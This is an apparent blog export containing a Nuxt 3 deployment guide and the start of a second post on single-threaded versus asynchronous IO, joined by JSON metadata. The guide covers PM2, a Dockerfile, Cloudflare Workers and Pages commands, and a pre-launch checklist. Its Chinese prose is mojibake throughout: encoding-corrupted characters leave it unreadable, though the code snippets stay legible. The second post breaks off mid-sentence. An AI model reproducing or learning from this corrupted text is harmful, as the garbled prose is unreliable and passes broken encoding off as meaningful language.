ä¹Ÿè¦æ³¨æ„ä½¿å¦æœ‰ä½¿ç”¨åˆ° Nuxt å°ˆæ¡ˆå»ºç«‹çš„ Server APIï¼Œå†æ±ºå®šæ˜¯å¦éœ€è¦ Nitro ä¼ºæœå™¨ä¾†å•Ÿå‹•æ­£å¼ç’°å¢ƒçš„ç¶²ç«™æœå‹™ã€‚ç•¶ä¸€åˆ‡å°±ç·’ä¹‹å¾Œæœ€å¾Œå°±èƒ½å°‡è¼¸å‡ºçš„ç›®éŒ„æ‰“åŒ…é€²è¡Œéƒ¨ç½²ã€‚\nå°±å‰©æœ€å¾Œä¸€æ­¥äº† - éƒ¨ç½² (Deployment) Nuxt 3 çš„å°ˆæ¡ˆæ‡‰ç”¨ç¨‹å¼ï¼Œå¯ä»¥éƒ¨ç½²åœ¨ Node.js çš„ä¼ºæœå™¨ä¸Šé¢ï¼Œä¹Ÿå¯ä»¥å°‡é æ¸²æŸ“çš„éœæ…‹ç¶²ç«™ç”±éœæ…‹è¨—ç®¡å¹³å°ä¾†æœå‹™ï¼Œæˆ–é€™éƒ¨ç½²è‡³ç„¡ä¼ºæœå™¨ (serverless) æˆ– CDN ç’°å¢ƒä¸Šã€‚\nä½¿ç”¨ Node.js ä¼ºæœå™¨ Nuxt 3 çš„å°ˆæ¡ˆé è¨­ä½¿ç”¨ Nitro ä¾†ä½œç‚ºæœå‹™å¼•æ“ï¼Œæ‰€ä»¥æˆ‘å€‘åœ¨ä»»ä½• Node.js ä¼ºæœå™¨ç’°å¢ƒä¹‹ä¸‹ï¼ŒåŸºæœ¬ä¸Šéƒ½å¯ä»¥å•Ÿå‹• Nuxt å»ºç½®å‡ºä¾†çš„ Nitro Serverã€‚\nç•¶æˆ‘å€‘ä½¿ç”¨ npm run build å»ºæ§‹å°ˆæ¡ˆå¾Œï¼Œè¼¸å‡ºçš„ .output/server/index.mjs æª”æ¡ˆï¼Œå³æ˜¯ä¸€å€‹æº–å‚™å•Ÿå‹• Node ä¼ºæœå™¨çš„å…¥å£é»ã€‚\næˆ‘å€‘å¯ä»¥é€éä¸‹åˆ—æŒ‡ä»¤ä¾†å•Ÿå‹•æˆ‘å€‘å»ºæ§‹å¥½çš„å°ˆæ¡ˆã€‚\n1 node .output/server/index.mjs åŸ·è¡Œå¾Œå¦‚ä¸‹é¢åœ–ç¤ºé¡¯ç¤ºï¼Œç¶²ç«™å°‡æ–¼ Prot: 3000 é€²è¡Œæœå‹™ç›£è½ã€‚\nä½ å¯ä»¥è¨­å®šä¸‹åˆ—ç’°å¢ƒè®Šæ•¸ä¾†èª¿æ•´é è¨­ç›£è½çš„ Port æˆ– Hostã€‚\nNITRO_PORT æˆ– PORTï¼šç›£è½çš„ Port (é è¨­ç‚º 3000) NITRO_HOST æˆ– HOSTï¼šæœå‹™çš„ Host (æ²’æœ‰é è¨­å€¼ï¼Œä½†é è¨­ç›£è½æ‰€æœ‰çš„ç¶²è·¯ä»‹é¢åŒ…å« IPv4 èˆ‡ IPv6 çš„ä½å€ ) NITRO_SSL_CERT èˆ‡ NITRO_SSL_KEYï¼šå¦‚æœå…©è€…çš†è¨­å®šï¼Œå°‡ä»¥ HTTPS æ¨¡å¼ä¸‹å•Ÿå‹•ä¼ºæœå™¨ï¼Œé€šå¸¸åƒ…ä½œç‚ºæ¸¬è©¦ç”¨é€”ï¼Œå› ç‚ºå»ºè­°å°‡ SSL æ†‘è­‰ç­‰è¨­å®šæ–¼æä¾›åå‘ä»£ç†çš„æœå‹™ï¼Œä¾‹å¦‚ NGINX æˆ– CloudFlareï¼ŒNitro ä¼ºæœå™¨å‰‡åŸ·è¡Œåœ¨åå‘ä»£ç†å¾Œé¢ã€‚ éƒ¨ç½²æ™‚ï¼Œä½ å¯ä»¥å°‡æ•´å€‹ .output ä¸Šå‚³è‡³æ­£å¼ç’°å¢ƒçš„æ©Ÿå™¨ä¸Šï¼Œä¸¦ä½¿ç”¨ Node.js åšåŸ·è¡Œï¼Œä½†ç‚ºäº†é˜²æ­¢æˆ‘å€‘çš„æœå‹™å› ç‚ºç•°å¸¸ï¼Œå°è‡´ Node.js æœå‹™æ„å¤–å´©æ½°ï¼Œæˆ‘å€‘éœ€è¦ä¸€å€‹ Process çš„ Daemonï¼Œä¾†å°‡æœå‹™å¸¸é§ï¼Œæ„å¤–å´©æ½°æ™‚èƒ½è‡ªå‹•é‡å•Ÿï¼Œä¾†ç¶­æŒæ•´å€‹ç¶²ç«™çš„æ­£å¸¸æœå‹™ã€‚\né€šå¸¸æˆ‘å€‘æœƒåœ¨æ­£å¼ç’°å¢ƒä½¿ç”¨ PM2 ä¾†ç®¡ç† Node.js çš„æœå‹™ï¼ŒPM2 æ˜¯ç¶­æŒä¸€å€‹ Process åŸ·è¡Œçš„ç®¡ç†å™¨ï¼Œæˆ‘å€‘å¯ä»¥è—‰ç”± PM2 ä¾†å•Ÿå‹•æˆ‘å€‘çš„ Nitro Serverï¼Œç•¶æœå‹™å´©æ½°æ™‚èƒ½è‡ªå‹•çš„é‡æ–°å•Ÿå‹•ï¼Œä»¥ç¶­æŒæœå‹™çš„æ­£å¸¸é‹ä½œï¼Œé™¤æ­¤ä¹‹å¤– PM2 å¯ä»¥å•Ÿç”¨å¢é›† (Cluster) çš„åŠŸèƒ½çµåˆè«‹æ±‚çš„é™„è¼‰å¹³è¡¡ï¼Œä¾†è®“å¤šæ ¸å¿ƒçš„æ©Ÿå™¨æå‡è³‡æºçš„åˆ©ç”¨ç‡èˆ‡æ•ˆèƒ½ï¼Œæ›´é‚„æœ‰ç›£æ¸¬å¤šé …æ•¸æ“šç­‰åŠŸèƒ½å¯ä¾›æ­£å¼ç’°å¢ƒåšä½¿ç”¨ã€‚\nä½¿ç”¨ PM2 ä½¿ç”¨çš„æ–¹å¼ä¹Ÿå¾ˆç°¡å–®ï¼Œé¦–å…ˆä½¿ç”¨ NPM å®‰è£ PM2ï¼Œå¯ä»¥åŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤ï¼š\n1 npm install -g pm2 åœ¨ Nuxt å°ˆæ¡ˆç›®éŒ„ä¸‹å»ºç«‹ ecosystem.config.js æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\necosystem.config.js 1 2 3 4 5 6 7 8 9 10 module.exports = { apps: [ { name: \u0026#39;NuxtAppName\u0026#39;, exec_mode: \u0026#39;cluster\u0026#39;, instances: \u0026#39;max\u0026#39;, script: \u0026#39;./.output/server/index.mjs\u0026#39; } ] } æ¥è‘—æˆ‘å€‘å°±èƒ½ä½¿ç”¨ PM2 ä¾†åŸ·è¡Œæˆ‘å€‘çš„æœå‹™ï¼š\n1 pm2 start ecosystem.config.js ä½ ä¹Ÿå¯ä»¥åœ¨ ecosystem.config.js ä¸­æ·»åŠ ç’°å¢ƒè®Šæ•¸ã€‚\necosystem.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 module.exports = { apps: [ { name: \u0026#39;NuxtAppName\u0026#39;, exec_mode: \u0026#39;cluster\u0026#39;, instances: \u0026#39;max\u0026#39;, script: \u0026#39;./.output/server/index.mjs\u0026#39;, env: { NITRO_PORT: 3001, NITRO_HOST: \u0026#39;127.0.0.1\u0026#39; } } ] } è£½ä½œ Docker Image ç›®å‰ä½¿ç”¨ Docker ä¾†éƒ¨ç½²æœå‹™çš„ä¹Ÿä¸åœ¨å°‘æ•¸ï¼Œå€‹äººä¹Ÿæ˜¯æ¡ç”¨å®¹å™¨åŒ–ä¾†å•Ÿå‹•ç¶²ç«™æœå‹™ä¸¦æ•´åˆ CI/CD è‡ªå‹•åŒ–çš„æµç¨‹ä¾†å»ºæ§‹èˆ‡éƒ¨ç½² Nuxt 3 å°ˆæ¡ˆï¼Œä»¥ä¸‹å°‡åˆ—å‡ºè‡ªå·±ä½¿ç”¨çš„ Dockerfileï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥å†åƒè€ƒçœ‹çœ‹ã€‚\nå°ˆæ¡ˆç›®éŒ„ä¸‹å»ºç«‹ Dockerfile æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nDockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 FROM node:16-alpine AS builder RUN mkdir -p /nuxt-app WORKDIR /nuxt-app COPY . . RUN npm ci \u0026amp;\u0026amp; npm cache clean --force RUN npm run build FROM keymetrics/pm2:16-alpine RUN mkdir -p /nuxt-app/.output WORKDIR /nuxt-app/.output COPY --from=builder /nuxt-app/.output . COPY ./ecosystem.config.js /nuxt-app ENV NUXT_HOST=0.0.0.0 ENV NUXT_PORT=3000 EXPOSE 3000 ENTRYPOINT [\u0026#34;pm2-runtime\u0026#34;, \u0026#34;start\u0026#34;, \u0026#34;/nuxt-app/ecosystem.config.js\u0026#34;] æ‰“é–‹çµ‚ç«¯æ©Ÿ (Terminal)ï¼Œä¸¦æ–¼å°ˆæ¡ˆç›®éŒ„ä¸‹åŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤ï¼š\n1 docker build -t nuxt-app . ç•¶é–‹å§‹è£½ä½œ Docker Image æ™‚ï¼Œæœƒä¾ç…§ Dockerfile ä¾†å»ºç½®ï¼Œä¸»è¦åˆ†æˆå…©å€‹éƒ¨åˆ†ï¼Œé¦–å…ˆæˆ‘æœƒå…ˆåœ¨ node:16-alpine å®¹å™¨ç’°å¢ƒä¸­åŸ·è¡Œå»ºæ§‹ (build) çš„æŒ‡ä»¤ï¼Œä¸¦å°‡éœ€è¦éƒ¨ç½²çš„ç›®éŒ„ .output è¤‡è£½è‡³ keymetrics/pm2:16-alpine å®¹å™¨ç’°å¢ƒä¸­ï¼Œé€™æ¨£æœ€çµ‚ä½¿ç”¨ PM2 åŸ·è¡Œæœå‹™çš„ Image å¤§å°å°±æœƒç¨å¾®å°ä¸€äº›ã€‚\nç•¶ Docker Image è£½ä½œå®Œç•¢å¾Œï¼Œå¯ä»¥å†è—‰ç”± docker run æˆ– docker compose ç”šè‡³ k8s ä¾†å•Ÿå‹•æœå‹™å¾Œï¼Œå†ç”±å¦‚ NGINX æä¾›åå‘ä»£ç†æœå‹™é€£æ¥åˆ°å…§éƒ¨çš„ Nitro Serverã€‚\néƒ¨ç½²è‡³ CloudFlare Workers æˆ‘å€‘ä¹Ÿå¯ä»¥å°‡ Nuxt éƒ¨ç½²åˆ°ç„¡ä¼ºæœå™¨ (Serverless) çš„ç’°å¢ƒï¼Œå®˜æ–¹æä¾›äº†å¤šç¨®çš„é è¨­éƒ¨ç½²å¯ä»¥åšä½¿ç”¨ï¼Œæˆ‘å€‘å°±ç°¡å–®ä»¥ä¸€å€‹ä¹¾æ·¨çš„ Nuxt 3 å°ˆæ¡ˆä¾†åšç¯„ä¾‹ï¼Œå˜—è©¦éƒ¨ç½²åˆ° CloudFlare Workersã€‚\né¦–å…ˆï¼Œæˆ‘å€‘å…ˆæº–å‚™ä¸€å€‹ Nuxt 3 å°ˆæ¡ˆï¼Œåœ¨æ­¤æˆ‘ä½¿ç”¨ä¸‹åˆ—æŒ‡ä»¤å»ºç«‹ä¸€å€‹ä¹¾æ·¨çš„ Nuxt 3 å°ˆæ¡ˆï¼Œä¸¦é€²å…¥å°ˆæ¡ˆç›®éŒ„å®‰è£å¥—ä»¶ï¼š\n1 2 3 npx nuxi init nuxt-app cd nuxt-app npm install ä½¿ç”¨ NPM å®‰è£ wranglerï¼Œå®ƒæ˜¯ç”¨æ–¼å»ºæ§‹ Cloudflare Workers çš„å‘½ä»¤åˆ—å·¥å…· (command line tool)ã€‚\n1 npm install -g wrangler ä½ å¯èƒ½éœ€è¦è¨»å†Šä¸€å€‹ CloudFlare çš„å¸³è™Ÿï¼Œä¸¦ä½¿ç”¨ä¸‹åˆ—æŒ‡ä»¤ä¾†ç™»å…¥ CloudFlare å¸³è™Ÿä¸¦æˆæ¬Š Wrangler ä¾†å»ºç«‹ CloudFlare Workersï¼Œæˆ‘å€‘é¸æ“‡å…è¨± (Allow) å³å¯ã€‚\n1 wrangler login æ–¼å°ˆæ¡ˆç›®éŒ„ä¸‹å»ºç«‹ wrangler.toml å…§å®¹å¦‚ä¸‹ï¼š\nwrangler.toml 1 2 3 4 5 6 7 name = \u0026#34;nuxt-app-hello\u0026#34; main = \u0026#34;./.output/server/index.mjs\u0026#34; workers_dev = true compatibility_date = \u0026#34;2022-10-15\u0026#34; [site] bucket = \u0026#34;.output/public\u0026#34; æˆ‘å€‘å°‡ NITRO_PRESET ç’°å¢ƒè®Šæ•¸ï¼Œè¨­ç½®ç‚º cloudflare ä¸¦é–‹å§‹å»ºæ§‹æˆ‘å€‘çš„å°ˆæ¡ˆã€‚\n1 NITRO_PRESET=cloudflare npm run build æ¥ä¸‹ä¾†ï¼Œå¯ä»¥é¸æ“‡åŸ·è¡Œçµ‚ç«¯æ©Ÿæç¤ºçš„æŒ‡ä»¤ä¾†å•Ÿå‹•ä¼ºæœå™¨é€²è¡Œç›¸é—œæ¸¬è©¦ã€‚\n1 npx wrangler dev .output/server/index.mjs --site .output/public --local ç•¶ç¢ºèªå°ˆæ¡ˆæœå‹™é‹ä½œä¸Šæ²’å•é¡Œå¾Œï¼Œå¯ä»¥åŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤é€²è¡Œç™¼å¸ƒã€‚\n1 npx wrangler publish å®Œæˆç™¼å¸ƒå¾Œï¼Œå°±æœƒæç¤ºæˆ‘å€‘ç™¼å¸ƒå®ŒæˆåŠæœå‹™çš„ç¶²å€ï¼Œä¾‹å¦‚ https://nuxt-app-hello.ryanchien8125.workers.devï¼Œæˆ‘å€‘å°±å¯ä»¥ç€è¦½æˆ‘å€‘éƒ¨ç½²å¥½çš„ç¶²ç«™å›‰ã€‚\néœæ…‹çš„ç¶²ç«™éƒ¨ç½²è‡³ CloudFlare Pages æˆ‘å€‘ä½¿ç”¨ Nuxt 3 å¯ä»¥é æ¸²æŸ“å…¨éœæ…‹çš„ç¶²ç«™ï¼Œå› æ­¤ä¹Ÿå¯ä»¥å°‡å°ˆæ¡ˆéƒ¨ç½²è‡³éœæ…‹è¨—ç®¡å¹³å°ï¼Œä»¥ CloudFlare Pages ç‚ºä¾‹ï¼Œéƒ¨ç½²çš„æ­¥é©Ÿå¦‚ä¸‹ï¼š\né¦–å…ˆï¼Œå…ˆåŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤é€²è¡Œå…¨ç«™çš„é æ¸²æŸ“ï¼š\n1 2 3 npm run generate # or # yarn run generate ä½¿ç”¨ NPM å®‰è£ wranglerã€‚\n1 npm install -g wrangler ä½ å¯èƒ½éœ€è¦è¨»å†Šä¸€å€‹ CloudFlare çš„å¸³è™Ÿï¼Œä¸¦ä½¿ç”¨ä¸‹åˆ—æŒ‡ä»¤ä¾†ç™»å…¥ CloudFlare å¸³è™Ÿä¸¦æˆæ¬Š Wranglerï¼Œæˆ‘å€‘é¸æ“‡å…è¨± (Allow) å³å¯ã€‚\n1 wrangler login å»ºç«‹ä¸€å€‹ CloudFlare Pages åç‚º nuxt-app-blogã€‚\n1 wrangler pages project create nuxt-app-blog ä½¿ç”¨ä¸‹åˆ—æŒ‡ä»¤ï¼Œå°‡é æ¸²æŸ“çš„ç¶²ç«™ç›®éŒ„é€²è¡Œéƒ¨ç½²ï¼Œä¸¦æŒ‡å®šå°ˆæ¡ˆåç¨±ç‚º nuxt-app-blogï¼š\n1 wrangler pages publish ./.output/public --project-name nuxt-app-blog ç•¶éƒ¨ç½²å®Œæˆå¾Œï¼Œå°±æœƒå¾—åˆ°ä¸€å€‹é€£çµä¾†æŸ¥çœ‹éƒ¨ç½²çš„éœæ…‹ç¶²é ï¼Œä½ ä¹Ÿå¯ä»¥å¾ CloudFlare Pages å¾Œå°ï¼Œçœ‹è¦‹ç¶²ç«™ç¶²å€çš„åˆ¥å Aliases ä¾†ä½¿ç”¨è‡ªè¨‚çš„ç¶²å€ã€‚\nä»¥ä¸Šæ˜¯ä»‹ç´¹ Nuxt 3 çš„å¹¾å€‹éƒ¨ç½²æ–¹å¼çš„ä¾‹å­ï¼Œæ›´å¤šé›²ç«¯å¹³å°ä¸Šé¢çš„éƒ¨ç½²ï¼Œä¹Ÿå¯ä»¥åƒè€ƒ Nuxt èˆ‡ Nitro å®˜æ–¹æ–‡ä»¶ã€‚\nä¸Šç·šå‰çš„æ¸¬è©¦é …ç›® æœ€å¾Œèˆ‡å¤§å®¶åˆ†äº«ä¸€ä¸‹ç¶²ç«™å°ˆæ¡ˆä¸Šç·šå‰çš„å¹¾å€‹æˆ‘æœƒç‰¹åˆ¥æ³¨æ„çš„å¹¾å€‹å°ç´°ç¯€ï¼Œä¹Ÿæ­¡è¿å¤§å®¶ä¸€èµ·ä¾†äº¤æµã€‚\nå‰ç«¯ç´°ç¯€ ç¶²é çš„æ¨™é¡Œ (Title) ä½¿ç”¨ä¹‹è³‡æºæˆæ¬Š (ä½¿ç”¨æ¬Šã€æ™ºè²¡æ¬Š) åœ–ç‰‡æ›¿ä»£æ–‡å­— Favicon HTML Meta data Google Analytics ç€è¦½å™¨ç›¸å®¹æ€§æ¸¬è©¦ RWD è·¨ç€è¦½å™¨ BrowserStack Comparium TestingBot API æ¸¬è©¦ å–®å…ƒæ¸¬è©¦ ä¸åŒå ´æ™¯æ¸¬è©¦ (æ¸¬è©¦ç’°å¢ƒã€æ­£å¼ç’°å¢ƒ) æ•ˆèƒ½æ¸¬è©¦ JMeter k6 å®‰å…¨æ€§æ¸¬è©¦ å£“åŠ›æ¸¬è©¦ æ¨¡æ“¬ä½¿ç”¨è€…æˆ–é€£ç·šæ•¸ è§€å¯Ÿæ©Ÿå™¨è³‡æºä½¿ç”¨é‡ è³‡æ–™åº«é€£ç·šæ•¸è§€å¯Ÿ æŒçºŒæé«˜æ¨¡æ“¬æ•¸é‡è§€å¯Ÿåˆ†æ åˆ†ææ¯å€‹è«‹æ±‚æ–¼ä½µç™¼çš„å¹³å‡éŸ¿æ‡‰æ™‚é–“ æ˜¯å¦è«‹æ±‚ä¸­å¤¾é›œéé æœŸä¹‹ç‹€æ…‹ç¢¼ (HTTP Status Code) API æˆ–ç¶²ç«™å®‰å…¨æ€§ åƒè€ƒ OWASP Top 10 SQL åƒæ•¸åŒ–æŸ¥è©¢ è³‡å®‰å…¬å¸æ»²é€æ¸¬è©¦ã€ç´…éšŠæ¼”ç·´ é–‹ç™¼æˆ–é™¤éŒ¯ç”¨çš„è¨Šæ¯ è­¦å‘Šè¨Šæ¯æˆ–ç•°å¸¸è¨Šæ¯ç§»é™¤ï¼ˆconsole.log æˆ–è­¦å‘Šè¨Šæ¯ç­‰ï¼‰ JavaScript Source Maps è¨˜å¾—ç§»é™¤ æ•æ„Ÿè³‡è¨Šè¨˜å¾—ç§»é™¤ (é–‹ç™¼ç”¨ Keyã€å¸³è™Ÿå¯†ç¢¼ç­‰) ç¶²ç«™ç›¸ä¾æ€§æª¢æŸ¥ ä½¿ç”¨åˆ°ç¬¬ä¸‰æ–¹ç¶²ç«™è³‡æºåŠç©©å®šæ€§ æª¢æŸ¥æ‰€æœ‰ç¶²å€çš†èƒ½æ­£å¸¸é‹ä½œ ç•¶ç¬¬ä¸‰æ–¹ç¶²ç«™ç•°å¸¸æ™‚æ‡‰å°æªæ–½ éƒ¨ç½²ç›¸é—œ æ˜¯å¦æœ‰é«˜å¯ç”¨æ€§ (HA) Docker æˆ– Kubernetes æ•´åˆ ç¶²åŸŸæ™‚æ•ˆ SSL è­‰æ›¸æ—¥æœŸ é˜²ç«ç‰†æˆ– WAF è¨­å®š å…§ç¶²æˆ–å¤–ç¶²å€éš” å‚™ä»½æ©Ÿåˆ¶ éœæ…‹æœ‰ç‹€æ…‹è³‡æ–™ (ä½¿ç”¨è€…ä¸Šå‚³çš„) è³‡æ–™åº«è³‡æ–™ é€™é‚Šä¸»è¦èˆ‡å¤§å®¶åˆ†äº«å¹¾ç¨® Nuxt çš„éƒ¨ç½²æ–¹å¼ï¼Œä¸ç®¡æ˜¯éƒ¨ç½²åœ¨è‡ªå·±çš„æ©Ÿæˆ¿ä¸»æ©Ÿæˆ–é›²ç«¯ï¼Œå¤§å®¶å¯ä»¥åœ¨æŒ‘é¸åˆé©çš„è§£æ±ºæ–¹æ¡ˆï¼ŒNitro ä¹Ÿæ”¯æ´ç„¡ä¼ºæœå™¨ (Serverless) ç­‰éƒ¨ç½²æ–¹å¼éå¸¸çš„æ–¹ä¾¿ï¼Œåªæ˜¯è¦ç‰¹åˆ¥æ³¨æ„åˆ° Serverless åŸ·è¡Œä¸€äº› binary çš„å•é¡Œï¼Œå†æŒ‘é¸è‡ªå·±é©åˆçš„éƒ¨ç½²èˆ‡æœå‹™æ–¹å¼ã€‚\nç¶“éæœ¬ç¯‡æ–‡ç« ï¼Œå¤§å®¶æ‡‰è©²éƒ½å°æ–¼ Nuxt 3 æœ‰åˆæ­¥çš„ç†è§£ï¼Œæ¥ä¸‹ä¾†ä¸‹ä¸€ç¯‡æ–‡ç« æˆ‘å€‘å°‡æœƒé€²å…¥å¯¦æˆ°ç·´ç¿’ï¼Œå°‡æœƒä»¥ Nuxt 3 ä¾†å¯¦ä½œä¸€å€‹éƒ¨è½æ ¼ç¶²ç«™ï¼\n","date":"2023-01-14T00:00:00Z","image":"https://live.staticflickr.com/65535/52616698791_b7b8bbce05_o.jpg","permalink":"https://wayneblog.ga/2023-01-14/nuxt-try-nuxt3/","title":"ã€Nuxt3ã€‘é–‹ç®±å³ç”¨çš„ Nuxt3 ç©è½‰ç­†è¨˜"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nä»¥ç”Ÿæ´»ä¾‹å­èªªæ˜å–®ç·šç¨‹èˆ‡å¤šç·šç¨‹ã€‚\nç¨‹åºè¨­è¨ˆçš„ç›®æ¨™ åœ¨æˆ‘çœ‹ä¾†å–®å¾ç¨‹åºçš„è§’åº¦ä¾†çœ‹ï¼Œä¸€å€‹å¥½çš„ç¨‹åºçš„ç›®æ¨™æ‡‰è©²æ˜¯æ€§èƒ½èˆ‡ç”¨æˆ¶é«”é©—çš„å¹³è¡¡ã€‚ç•¶ç„¶ä¸€å€‹ç¨‹åºæ˜¯å¦èƒ½å¤ æ»¿è¶³ç”¨æˆ¶çš„éœ€æ±‚æš«ä¸”ä¸è«‡ï¼Œé€™æ˜¯æ¥­å‹™å±¤é¢çš„å•é¡Œï¼Œæˆ‘å€‘åƒ…åƒ…è¨è«–ç¨‹åºæœ¬èº«ã€‚åœç¹å…©é»ä¾†å±•é–‹ï¼Œæ€§èƒ½èˆ‡ç”¨æˆ¶é«”é©—ã€‚\næ€§èƒ½ï¼šé«˜æ€§èƒ½çš„ç¨‹åºæ‡‰è©²å¯ä»¥ç­‰åŒæ–¼CPUçš„åˆ©ç”¨ç‡ï¼ŒCPUçš„åˆ©ç”¨ç‡è¶Šé«˜(ä¸€ç›´åœ¨å·¥ä½œï¼Œæ²’æœ‰é–’ä¸‹ä¾†çš„æ™‚å€™)ï¼Œç¨‹åºçš„æ€§èƒ½è¶Šé«˜ã€‚ é«”é©—ï¼šé€™è£çš„é«”é©—ä¸åªæ˜¯ç•Œé¢å¤šéº¼æ¼‚äº®ï¼ŒåŠŸèƒ½å¤šéº¼é †æ‰‹ï¼Œé€™è£çš„é«”é©—æŒ‡ç¨‹åºçš„éŸ¿æ‡‰é€Ÿåº¦ï¼ŒéŸ¿æ‡‰é€Ÿåº¦è¶Šå¿«ï¼Œç”¨æˆ¶é«”é©—è¶Šå¥½ã€‚ ä¸‹é¢æˆ‘å€‘å°±é€™å…©é»é€²è¡Œå„ç¨®æ¨¡å‹çš„è¨è«–ã€‚\nå–®ç·šç¨‹å¤šä»»å‹™ç„¡é˜»å¡ ä»¥ç”Ÿæ´»ä¸­é£Ÿå ‚æ‰“é£¯çš„å ´æ™¯ä½œçˆ²æ¯”å–»ï¼Œå‡è¨­æœ‰é€™æ¨£çš„å ´æ™¯ï¼Œå°Aï¼Œå°Bï¼Œå°C åœ¨çª—å£ä¾æ¬¡æ’éšŠæ‰“é£¯ã€‚\nå‡è¨­çª—å£è² è²¬æ‰“é£¯çš„é˜¿å§¨æ‰“ä¸€å€‹èœéœ€è¦è€—æ™‚1ç§’ã€‚å¦‚æœå°Aéœ€è¦2å€‹èœï¼Œå°Béœ€è¦3å€‹èœï¼Œå°Céœ€è¦2å€‹èœã€‚å¦‚ä¸‹ï¼š\né˜¿å§¨(CPU)ï¼šæ‰“ä¸€å€‹èœéœ€è¦1ç§’ å°Aï¼š2å€‹èœ å°Bï¼š3å€‹èœ å°Cï¼š2å€‹èœ é‚£éº¼åœ¨é€™ç¨®æ¨¡å‹ä¸‹å°‡æ‰€æœ‰æœå‹™åšå®Œé˜¿å§¨éœ€è¦è€—æ™‚ 2 + 3 + 2 = 7ç§’\né˜¿å§¨ = CPUï¼Œå°Aã€å°Bã€å°C = ä»»å‹™(é€™è£æ˜¯ä»¥ä»»å‹™çˆ²æ¦‚å¿µï¼Œè¡¨ç¤ºéœ€è¦åšä¸€äº›äº‹æƒ…)\né€™ç¨®æ¨¡å‹ä¸‹CPUæ˜¯æ»¿è² è·ä¸é–“æ–·é‹è½‰çš„ï¼Œæ²’æœ‰ç©ºé–’ï¼Œç”¨æˆ¶é«”é©—é‚„ä¸éŒ¯ã€‚\né€™ç¨®ç¨‹åºä¸­æ¯å€‹ä»»å‹™çš„è€—æ™‚éƒ½æ¯”è¼ƒå°ï¼Œæ˜¯éå¸¸ç†æƒ³çš„ç‹€æ…‹ï¼Œä¸€èˆ¬æƒ…æ³ä¸‹åŸºæœ¬ä¸å¤ªå¯èƒ½å­˜åœ¨ã€‚\nå–®ç·šç¨‹å¤šä»»å‹™IOé˜»å¡ å°‡ä¸Šé¢çš„å ´æ™¯ç¨å¾®åšæ”¹å‹•ï¼š\né˜¿å§¨ï¼šæ‰“ä¸€å€‹èœéœ€è¦1ç§’ å°Aï¼š2å€‹èœï¼Œä½†æ˜¯å¿˜è¨˜å¸¶éŒ¢äº†ï¼Œè¦æ‰¾åŒå­¸é€éä¾†ï¼Œä¼°è¨ˆéœ€è¦ç­‰5åˆ†é˜å¯ä»¥é€åˆ°(å¯ä»¥ç†è§£çˆ²ç£ç›¤IO) å°Bï¼š3å€‹èœ å°Cï¼š2å€‹èœ é€™ç¨®æƒ…æ³ä¸‹å°Aé€™è£ç™¼ç”Ÿäº†é˜»å¡ï¼Œå¯¦éš›ä¸Šå°Aé€™è£è€—è²»äº†5åˆ†é˜ä¹Ÿå°±æ˜¯ 300ç§’ + 2å€‹èœçš„æ™‚é–“ï¼Œä¹Ÿå°±æ˜¯302ç§’ï¼Œè€ŒCPUå‰‡ç©ºé–’äº†300ç§’ï¼Œå¯¦éš›ä¸Šå·¥ä½œ2ç§’ã€‚\næ‰€æœ‰æœå‹™åšå®ŒèŠ±è²» 302 + 3 + 2 = 307ç§’ï¼ŒCPUå¯¦éš›å·¥ä½œ7ç§’ï¼Œç­‰å¾…300ç§’ã€‚æ¥µå¤§æµªè²»äº†CPUçš„æ™‚é˜é€±æœŸã€‚\nç”¨æˆ¶é«”é©—å¾ˆå·®ï¼Œå› çˆ²å°Aé˜»å¡çš„æ™‚å€™ï¼Œå¾Œé¢çš„æ‰€æœ‰äººéƒ½ç­‰ç€ï¼Œè€Œå¯¦éš›ä¸Šæ­¤æ™‚CPUç©ºé–’ã€‚æ‰€ä»¥å–®ç·šç¨‹ä¸­ä¸è¦æœ‰é˜»å¡å‡ºç¾ã€‚\nå–®ç·šç¨‹å¤šä»»å‹™ç•°æ­¥IO é‚„æ˜¯ä¸Šé¢çš„æ¨¡å‹ï¼ŒåŠ å…¥ä¸€å€‹è§’è‰²ï¼šå€¼æ—¥ç”Ÿå°å“¥ï¼Œä»–è² è²¬äº‹å…ˆè©¢å•æ¯ä¸€å€‹äººæ˜¯å¦å¸¶éŒ¢äº†ï¼Œå¦‚æœå¸¶éŒ¢äº†å‰‡å…è¨±æ‰“èœï¼Œå¦å‰‡æŠŠéŒ¢æº–å‚™å¥½äº†å†èªªã€‚\nå€¼æ—¥ç”Ÿå°å“¥å•å°Aæº–å‚™å¥½æ‰“èœäº†å—ï¼Œå°Aèªªå¿˜å¸¶éŒ¢äº†ï¼Œå€¼æ—¥ç”Ÿå°å“¥èªªï¼Œä½ æŠŠéŒ¢æº–å‚™å¥½äº†å†èªªï¼Œå°Aé–‹å§‹æº–å‚™(éœ€è¦300ç§’ï¼Œå¾æ­¤åˆ»é–‹å§‹è¨˜æ™‚)ã€‚ å€¼æ—¥ç”Ÿå°å“¥å•å°Bæº–å‚™å¥½æ‰“èœäº†å—ï¼Œå°Bèªªå¯ä»¥äº†ï¼Œé˜¿å§¨æœå‹™å°Bï¼Œè€—æ™‚3ç§’ã€‚ å€¼æ—¥ç”Ÿå°å“¥å•å°Cæº–å‚™å¥½æ‰“èœäº†å—ï¼Œå°Cèªªå¯ä»¥äº†ï¼Œé˜¿å§¨æœå‹™å°Cï¼Œè€—æ™‚2ç§’ã€‚ å€¼æ—¥ç”Ÿå°å“¥å•å°Aæº–å‚™å¥½äº†æ²’æœ‰ï¼Œå°Aèªªé‚„è¦ç­‰ä¸€æœƒï¼Œé˜¿å§¨ç”±æ–¼æ²’æœ‰äººéä¾†æœå‹™ï¼Œè™•æ–¼ç©ºé–’ç‹€æ…‹ã€‚ 300ç§’ä¹‹å¾Œï¼Œå°Aæº–å‚™å¥½äº†ï¼Œé˜¿å§¨æœå‹™å°Aï¼Œè€—æ™‚2ç§’ã€‚ æ•´å€‹éç¨‹åšå®Œè€—æ™‚ 300 + 2 = 